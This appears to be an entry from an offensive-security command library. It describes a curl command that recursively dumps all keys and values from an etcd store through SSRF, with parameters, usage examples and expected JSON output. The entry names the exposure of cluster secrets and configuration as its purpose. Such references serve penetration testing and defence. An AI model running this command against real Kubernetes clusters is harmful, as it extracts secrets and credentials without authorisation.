---
type: command
executor: bash
data: curl $_TARGET_URL/v2/keys/?recursive=true
output: null
platforms:
  - Linux
  - Kubernetes
tags:
  - ssrf
  - discovery
  - etcd
verified: true
validated: true
---

# curl-get-etcd-recursive-keys

## Command

```bash
curl $_TARGET_URL/v2/keys/?recursive=true
```

## Description

This command retrieves all keys and values from an ETCD store recursively, exposing configuration data, secrets, and cluster state in SSRF exploitation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TARGET_URL | Base URL of the ETCD server (e.g., http://127.0.0.1:2379) | Yes |
| recursive=true | Include all sub-keys in the response | Yes |

## Examples

### Basic Usage

```bash
curl http://127.0.0.1:2379/v2/keys/?recursive=true
```

### Advanced Usage

```bash
curl -s http://127.0.0.1:2379/v2/keys/?recursive=true | jq .
```

## Expected Output

Successful execution returns JSON like:

```json
{"action":"get","node":{"key":"/registry","dir":true,"nodes":[{"key":"/registry/pods","dir":true}]}}
```

This lists directory structures and values if present.

## Related

- [[procedures/Cloud-Instance-and-Kubernetes-ETCD-Enumeration-via-SSRF]]
- [[commands/curl-get-etcd-version]]
